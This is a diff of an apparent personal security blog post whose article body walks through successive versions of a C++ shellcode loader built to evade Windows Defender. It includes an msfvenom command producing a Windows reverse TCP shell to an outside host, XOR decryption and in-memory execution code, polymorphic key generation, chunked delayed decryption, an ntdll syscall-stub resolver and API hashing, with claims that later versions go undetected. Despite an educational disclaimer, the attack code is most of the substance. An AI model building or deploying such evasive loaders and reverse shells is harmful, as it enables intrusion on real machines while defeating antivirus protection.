@@ -9,29 +9,27 @@
     <meta name="description" content="Evolving Shellcode Loaders: From Basic XOR to API Hashing and Indirect Syscalls ⚠️ DISCLAIMER:This post is intended strictly for educational purposes. The techniques and code discussed are meant to de">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XOR Shellcode loader">
-<meta property="og:url" content="https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/index.html">
+<meta property="og:url" content="http://example.com/2025/05/22/XOR-Shellcode-loader/index.html">
 <meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
 <meta property="og:description" content="Evolving Shellcode Loaders: From Basic XOR to API Hashing and Indirect Syscalls ⚠️ DISCLAIMER:This post is intended strictly for educational purposes. The techniques and code discussed are meant to de">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/Xor_runner.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/antivirus_flaged.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/V1_detection.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/V2_Detection.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/V3_Bypasses_AV_defender.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/V3_Detection.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/V4_DETECTION.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/V4_NO_TRIGGER.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/v5.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/defender_check.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/gocheck_pass.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/Nothing_was_found.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Shell_Loader/sophos_detection.png">
-<meta property="article:published_time" content="2025-05-22T14:25:21.000Z">
-<meta property="article:modified_time" content="2025-05-22T11:27:01.554Z">
+<meta property="og:image" content="http://example.com/images/Shell_Loader/Xor_runner.png">
+<meta property="og:image" content="http://example.com/images/Shell_Loader/antivirus_flaged.png">
+<meta property="og:image" content="http://example.com/images/Shell_Loader/V1_detection.png">
+<meta property="og:image" content="http://example.com/images/Shell_Loader/V2_Detection.png">
+<meta property="og:image" content="http://example.com/images/Shell_Loader/V3_Bypasses_AV_defender.png">
+<meta property="og:image" content="http://example.com/images/Shell_Loader/V4_DETECTION.png">
+<meta property="og:image" content="http://example.com/images/Shell_Loader/v5.png">
+<meta property="og:image" content="http://example.com/images/Shell_Loader/defender_check.png">
+<meta property="og:image" content="http://example.com/images/Shell_Loader/gocheck_pass.png">
+<meta property="og:image" content="http://example.com/images/Shell_Loader/Nothing_was_found.png">
+<meta property="og:image" content="http://example.com/images/Shell_Loader/sophos_detection.png">
+<meta property="article:published_time" content="2025-05-22T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-13T10:32:46.088Z">
 <meta property="article:author" content="Panosoiko">
 <meta property="article:tag" content="Shells">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://panosoikogr.github.io/images/Shell_Loader/Xor_runner.png">
+<meta name="twitter:image" content="http://example.com/images/Shell_Loader/Xor_runner.png">
     
     
       
@@ -41,12 +39,12 @@
       
       
         
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
         
       
       
         
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
         
       
     
@@ -78,7 +76,7 @@
     
 	<!-- mathjax -->
 	
-<meta name="generator" content="Hexo 7.3.0"></head>
+<meta name="generator" content="Hexo 8.0.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -98,7 +96,7 @@
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/tags/">tags</a></li><!--
      --><!--
        --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
      -->
@@ -124,17 +122,17 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&text=XOR Shellcode loader"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&is_video=false&description=XOR Shellcode loader"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=XOR Shellcode loader&body=Check out this article: https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&name=XOR Shellcode loader&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&t=XOR Shellcode loader"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/22/XOR-Shellcode-loader/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&text=XOR Shellcode loader"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&is_video=false&description=XOR Shellcode loader"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XOR Shellcode loader&body=Check out this article: http://example.com/2025/05/22/XOR-Shellcode-loader/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&name=XOR Shellcode loader&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/22/XOR-Shellcode-loader/&t=XOR Shellcode loader"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -166,7 +164,7 @@
       
     <div class="postdate">
       
-        <time datetime="2025-05-22T14:25:21.000Z" class="dt-published" itemprop="datePublished">2025-05-22</time>
+        <time datetime="2025-05-22T04:00:00.000Z" class="dt-published" itemprop="datePublished">2025-05-22</time>
         
       
     </div>
@@ -187,13 +185,13 @@
 
   <div class="content e-content" itemprop="articleBody">
     <h1 id="Evolving-Shellcode-Loaders-From-Basic-XOR-to-API-Hashing-and-Indirect-Syscalls"><a href="#Evolving-Shellcode-Loaders-From-Basic-XOR-to-API-Hashing-and-Indirect-Syscalls" class="headerlink" title="Evolving Shellcode Loaders: From Basic XOR to API Hashing and Indirect Syscalls"></a>Evolving Shellcode Loaders: From Basic XOR to API Hashing and Indirect Syscalls</h1><blockquote>
-<p><strong>⚠️ DISCLAIMER:</strong><br>This post is intended <strong>strictly for educational purposes</strong>. The techniques and code discussed are meant to demonstrate how malware obfuscation and evasion tactics evolve, particularly in the context of defensive research, red teaming, and antivirus testing.<br>I do <strong>not condone</strong> the use of this information for illegal or malicious purposes and am <strong>not responsible</strong> for how others choose to use it. The code shared is <strong>not production-safe</strong> and must not be used in real-world environments without proper authorization.</p>
+<p>⚠️ DISCLAIMER:<br>This post is intended strictly for educational purposes. The techniques and code discussed are meant to demonstrate how malware obfuscation and evasion tactics evolve, particularly in the context of defensive research, red teaming, and antivirus testing.<br>I do not condone the use of this information for illegal or malicious purposes and am not responsible for how others choose to use it. The code shared is not production-safe and must not be used in real-world environments without proper authorization.</p>
 </blockquote>
 <hr>
 <h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><p>This post documents an experimental shellcode execution project developed in C++. The goal was to explore progressively more evasive techniques to defeat Windows Defender and similar AVs, starting from basic encoding up to polymorphic loaders with indirect syscalls and API hashing.</p>
 <hr>
 <h2 id="Initial-Payload"><a href="#Initial-Payload" class="headerlink" title="Initial Payload"></a>Initial Payload</h2><p>Generated with <code>msfvenom</code>:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.2.5 lport=8000 -f c &gt; shell_code.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.2.5 lport=8000 -f c &gt; shell_code.txt</span><br></pre></td></tr></table></figure>
 
 <hr>
 <h2 id="Version-1-Basic-XOR-Encoding"><a href="#Version-1-Basic-XOR-Encoding" class="headerlink" title="Version 1: Basic XOR Encoding"></a>Version 1: Basic XOR Encoding</h2><p>In the first version, a static XOR key (<code>&quot;verysecurepassword&quot;</code>) is used to encrypt the shellcode. The key is reused during decryption.</p>
@@ -202,12 +200,14 @@
 <h3 id="Loader-Decryption-Logic"><a href="#Loader-Decryption-Logic" class="headerlink" title="Loader Decryption Logic"></a>Loader Decryption Logic</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">xor_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">size_t</span> size, <span class="type">const</span> std::string&amp; key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        data[i] ^= key[i % key.<span class="built_in">size</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="Execution-Logic"><a href="#Execution-Logic" class="headerlink" title="Execution Logic"></a>Execution Logic</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* exec_mem = <span class="built_in">VirtualAlloc</span>(<span class="literal">nullptr</span>, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec_mem, encrypted_shellcode, shellcode_size);</span><br><span class="line"><span class="built_in">VirtualProtect</span>(exec_mem, shellcode_size, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line"><span class="built_in">CreateThread</span>(<span class="literal">nullptr</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)exec_mem, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br></pre></td></tr></table></figure>
-<p><img src="/images/Shell_Loader/Xor_runner.png" alt="Xor_runner"><br><img src="/images/Shell_Loader/antivirus_flaged.png" alt="antivirus_flaged"><br><img src="/images/Shell_Loader/V1_detection.png" alt="V1_detection"></p>
+
+<p><img src="/images/Shell_Loader/Xor_runner.png" alt="Xor_runner">  <img src="/images/Shell_Loader/antivirus_flaged.png" alt="antivirus_flaged">  <img src="/images/Shell_Loader/V1_detection.png" alt="V1_detection"></p>
 <hr>
 <h2 id="Version-2-XOR-Polymorphic-Key"><a href="#Version-2-XOR-Polymorphic-Key" class="headerlink" title="Version 2: XOR + Polymorphic Key"></a>Version 2: XOR + Polymorphic Key</h2><p>Random XOR key is generated during encryption. Output header includes the key and encrypted shellcode.</p>
 <h3 id="Key-Generation-Header-Output"><a href="#Key-Generation-Header-Output" class="headerlink" title="Key Generation + Header Output"></a>Key Generation + Header Output</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string <span class="title">generate_random_key</span><span class="params">(<span class="type">size_t</span> length)</span> </span>&#123;</span><br><span class="line">    std::string charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">    std::string key;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">        key += charset[<span class="built_in">rand</span>() % charset.<span class="built_in">size</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">output &lt;&lt; <span class="string">&quot;// Polymorphic XOR Key (length: &quot;</span> &lt;&lt; key.<span class="built_in">size</span>() &lt;&lt; <span class="string">&quot;)</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">output &lt;&lt; <span class="string">&quot;unsigned char xor_key[] = &#123; &quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; key.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">    output &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::uppercase &lt;&lt; (<span class="type">int</span>)(<span class="type">unsigned</span> <span class="type">char</span>)key[i];</span><br><span class="line">    <span class="keyword">if</span> (i != key.<span class="built_in">size</span>() - <span class="number">1</span>) output &lt;&lt; (<span class="built_in">rand</span>() % <span class="number">2</span> ? <span class="string">&quot;, &quot;</span> : <span class="string">&quot;,</span></span><br><span class="line"><span class="string">  &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">output &lt;&lt; <span class="string">&quot;&#125;;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/images/Shell_Loader/V2_Detection.png" alt="V2_Detection"></p>
 <hr>
 <h2 id="Version-3-Polymorphic-Loader-Generator"><a href="#Version-3-Polymorphic-Loader-Generator" class="headerlink" title="Version 3: Polymorphic Loader Generator"></a>Version 3: Polymorphic Loader Generator</h2><p>This version dynamically generates both the encrypted shellcode and the loader (<code>decoder.cpp</code>) with randomized identifiers and one of multiple decryption variants.</p>
@@ -216,34 +216,41 @@
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">size_t</span> len, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        data[i] = data[i] ^ key[k];</span><br><span class="line">        k = (k + <span class="number">1</span>) % xor_key_len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt3</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">size_t</span> len, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (idx &lt; len) &#123;</span><br><span class="line">        data[idx] ^= key[idx % xor_key_len];</span><br><span class="line">        ++idx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/Shell_Loader/V3_Bypasses_AV_defender.png" alt="V3_Bypasses_AV_defender"><br><img src="/images/Shell_Loader/V3_Detection.png" alt="V3_Detection"></p>
+
+<p><img src="/images/Shell_Loader/V3_Bypasses_AV_defender.png" alt="V3_Bypasses_AV_defender">  <a href="/images/Shell_Loader/V3_Detection.png">V3_Detection</a></p>
 <hr>
 <h2 id="Version-4-Chunked-Decode-Delays"><a href="#Version-4-Chunked-Decode-Delays" class="headerlink" title="Version 4: Chunked Decode + Delays"></a>Version 4: Chunked Decode + Delays</h2><p>Decryption is split into chunks with random delays, simulating benign runtime behavior.</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">delayed_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">size_t</span> len, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> chunk_size = <span class="number">32</span> + (<span class="built_in">rand</span>() % <span class="number">32</span>);</span><br><span class="line">    <span class="type">size_t</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (offset &lt; len) &#123;</span><br><span class="line">        <span class="type">size_t</span> current_chunk = (offset + chunk_size &gt; len) ? (len - offset) : chunk_size;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; current_chunk; ++i) &#123;</span><br><span class="line">            data[offset + i] ^= key[(offset + i) % xor_key_len];</span><br><span class="line">        &#125;</span><br><span class="line">        offset += current_chunk;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">500</span> + (<span class="built_in">rand</span>() % <span class="number">500</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/Shell_Loader/V4_DETECTION.png" alt="V4_DETECTION"><br><img src="/images/Shell_Loader/V4_NO_TRIGGER.png" alt="V4_NO_TRIGGER"><br>And we didnt get flagged by defender</p>
+
+<p><img src="/images/Shell_Loader/V4_DETECTION.png" alt="V4_DETECTION">  <a href="/images/Shell_Loader/V4_NO_TRIGGER.png">V4_NO_TRIGGER</a></p>
+<p>And we didnt get flagged by defender</p>
 <hr>
 <h2 id="Version-5-Indirect-Syscalls"><a href="#Version-5-Indirect-Syscalls" class="headerlink" title="Version 5: Indirect Syscalls"></a>Version 5: Indirect Syscalls</h2><p>Implemented indirect system calls by manually resolving <code>ntdll</code> exports and calling them via function pointers.</p>
 <h3 id="Stub-Resolver"><a href="#Stub-Resolver" class="headerlink" title="Stub Resolver"></a>Stub Resolver</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span>* <span class="title">resolve_stub</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* name)</span> </span>&#123;</span><br><span class="line">    HMODULE ntdll = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!ntdll) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="type">void</span>* addr = <span class="built_in">GetProcAddress</span>(ntdll, name);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* p = (<span class="type">unsigned</span> <span class="type">char</span>*)addr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p[i] == <span class="number">0x4C</span> &amp;&amp; p[i + <span class="number">1</span>] == <span class="number">0x8B</span>)</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">void</span>*)(p + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/Shell_Loader/v5.png" alt="v5"><br><img src="/images/Shell_Loader/defender_check.png" alt="defender_check"><br><img src="/images/Shell_Loader/gocheck_pass.png" alt="gocheck_pass"></p>
+
+<p><img src="/images/Shell_Loader/v5.png" alt="v5">  <img src="/images/Shell_Loader/defender_check.png" alt="defender_check">  <img src="/images/Shell_Loader/gocheck_pass.png" alt="gocheck_pass"></p>
 <hr>
 <h2 id="Version-6-API-Hashing-Indirect-Syscalls"><a href="#Version-6-API-Hashing-Indirect-Syscalls" class="headerlink" title="Version 6: API Hashing + Indirect Syscalls"></a>Version 6: API Hashing + Indirect Syscalls</h2><p>Combined MurmurHash3 API hashing and export table parsing to resolve syscall stubs without using function names.</p>
 <h3 id="MurmurHash3-Snippet"><a href="#MurmurHash3-Snippet" class="headerlink" title="MurmurHash3 Snippet"></a>MurmurHash3 Snippet</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">murmur_hash</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> seed = <span class="number">0x5A5A5A5A</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> h = seed;</span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(key);</span><br><span class="line">    <span class="comment">// ... truncated for brevity ...</span></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/images/Shell_Loader/Nothing_was_found.png" alt="Nothing_was_found"></p>
-<h3 id="Detection-Explanation"><a href="#Detection-Explanation" class="headerlink" title="Detection Explanation"></a><strong>Detection Explanation</strong></h3><ul>
-<li><strong>Detection Name:</strong> <code>C2_1a (T1095 mem/meter-b mem/meter-g)</code></li>
-<li><strong>MITRE Technique:</strong> T1095 — <em>Non-Application Layer Protocol</em></li>
-<li><strong>Indicators:</strong><ul>
-<li><code>mem/meter-b</code> and <code>mem/meter-g</code> suggest <strong>in-memory artifacts</strong> linked to <strong>Meterpreter</strong>.</li>
-<li>These are <strong>heuristics or behavioral indicators</strong> seen after payload execution — likely from:<ul>
-<li>Command and control (C2) <strong>network communication patterns</strong> (e.g. reverse HTTPS).</li>
-<li>Meterpreter <strong>staging or beaconing behavior</strong>.</li>
-<li><strong>Memory-resident code structures</strong> or recognizable strings (e.g., handler UUIDs, session checks).</li>
+<h3 id="Detection-Explanation"><a href="#Detection-Explanation" class="headerlink" title="Detection Explanation"></a>Detection Explanation</h3><ul>
+<li>Detection Name: <code>C2_1a (T1095 mem/meter-b mem/meter-g)</code></li>
+<li>MITRE Technique: T1095 — Non-Application Layer Protocol</li>
+<li>Indicators:<ul>
+<li><code>mem/meter-b</code> and <code>mem/meter-g</code> suggest in-memory artifacts linked to Meterpreter.</li>
+<li>These are heuristics or behavioral indicators seen after payload execution — likely from:<ul>
+<li>Command and control (C2) network communication patterns (e.g. reverse HTTPS).</li>
+<li>Meterpreter staging or beaconing behavior.</li>
+<li>Memory-resident code structures or recognizable strings (e.g., handler UUIDs, session checks).</li>
 </ul>
 </li>
 </ul>
 </li>
 </ul>
-<p><img src="/images/Shell_Loader/sophos_detection.png" alt="sophos_detection"><br>But now windows defender never flags the executable!</p>
+<p><img src="/images/Shell_Loader/sophos_detection.png" alt="sophos_detection"></p>
+<p>But now windows defender never flags the executable!</p>
+<hr>
 
   </div>
 </article>
@@ -265,7 +272,7 @@
         
           <li><a href="/search/">Search</a></li>
         
-          <li><a href="/tags/">Tags</a></li>
+          <li><a href="/tags/">tags</a></li>
         
           <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
         
@@ -281,17 +288,17 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&text=XOR Shellcode loader"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&is_video=false&description=XOR Shellcode loader"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=XOR Shellcode loader&body=Check out this article: https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
